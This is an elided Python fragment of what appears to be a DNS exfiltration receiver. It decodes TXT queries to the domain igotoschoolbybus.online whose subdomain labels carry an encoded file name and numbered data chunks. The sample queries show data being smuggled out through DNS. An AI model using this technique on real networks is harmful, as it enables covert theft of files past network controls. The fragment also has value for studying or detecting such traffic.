...
QUERIES = [
	("TXT", "init.ONSWG4TFORZS45DYOQXHI6DUPQZA.base64.igotoschoolbybus.online"),
	("TXT", "0.EO6ylFlsUc_7u_QD8gBDp8L8iFiGZGkhptC_QwnSem_ivrO3zFUgj-nfi9hMhgL.khV2U6tVzJq5EWnz-yXZhBWFmKMaKaM65qclb77kF5MWxV6mdVGDyj9BdDJS6uC.49h41eLONT5V_UHgksMdORol-2cYgWkzWj6H6ae8uRzgRMJjDmYss8XBOekyibe.tQVMNb2669ZzoRFkDZWIylBaJ5C.igotoschoolbybus.online"),
	("TXT", "1.Lp8co2gYHOgdIDqj7CIEWkM.igotoschoolbybus.online")
]
	...
	try:
		...
		for query in QUERIES:
			...
			# Else, start receiving the file, chunk by chunk
				...
				msg = qname[0:-(len(args.domainName)+1)] # Remove the top level domain name
				chunkNumber, rawData = msg.split('.',1)

				print(color("[+] Received chunk [{}] of [{}]".format(chunkNumber,nbChunks)))
				print(rawData)
